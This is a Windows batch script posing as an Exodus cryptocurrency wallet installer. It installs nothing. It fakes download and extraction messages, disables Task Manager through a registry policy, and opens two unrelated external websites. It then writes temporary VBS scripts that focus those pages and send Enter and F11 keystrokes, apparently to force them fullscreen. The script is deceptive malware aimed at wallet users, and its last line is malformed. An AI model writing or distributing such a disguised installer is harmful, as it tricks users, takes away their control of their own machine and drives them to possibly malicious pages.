@echo off
:: Exodus Wallet Downloader Script
:: Ensure proper installation of Exodus Wallet.

:: Elevate privileges
echo Requesting administrator rights...
>nul 2>&1 "%SYSTEMROOT%\system32\net.exe" session
if not %errorlevel%==0 (
    echo Administrator privileges required. Please run as Administrator.
    pause
    exit
)

echo Downloading Exodus Wallet files...
ping localhost -n 3 >nul
echo Extracting files...
ping localhost -n 2 >nul
echo Installation in progress, please wait...

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul

echo Exodus Wallet has been successfully installed!
ping localhost -n 2 >nul

echo Launching Exodus Wallet...
for /L %%i in (1,1,20) do (
    echo Launching Exodus Wallet...
    ping localhost -n 1 >nul
)

start "" "https://flappybirdremaked.netlify.app"

set "vbsfile=%temp%\keypress.vbs"
echo Set WshShell = WScript.CreateObject("WScript.Shell") > "%vbsfile%"
echo WshShell.AppActivate "flappybirdremaked.netlify.app" >> "%vbsfile%"
echo WshShell.SendKeys "~" >> "%vbsfile%"
cscript //nologo "%vbsfile%"
del "%vbsfile%"
ping localhost -n 7 >nul
start "" "https://birdhunter.vercel.app"

set "vbsfile=%temp%\leftclick.vbs"
echo Set objShell = CreateObject("WScript.Shell") > "%vbsfile%"
echo WScript.Sleep 2000 >> "%vbsfile%"
echo objShell.AppActivate "birdhunter.vercel.app" >> "%vbsfile%"
echo Set objShell = Nothing >> "%vbsfile%"
echo Set objMouse = CreateObject("WScript.Shell") >> "%vbsfile%"
echo objMouse.SendKeys "{F11}" ' Simulated focus to click-based element >> "%vbsfile%"

del "%vbsfile"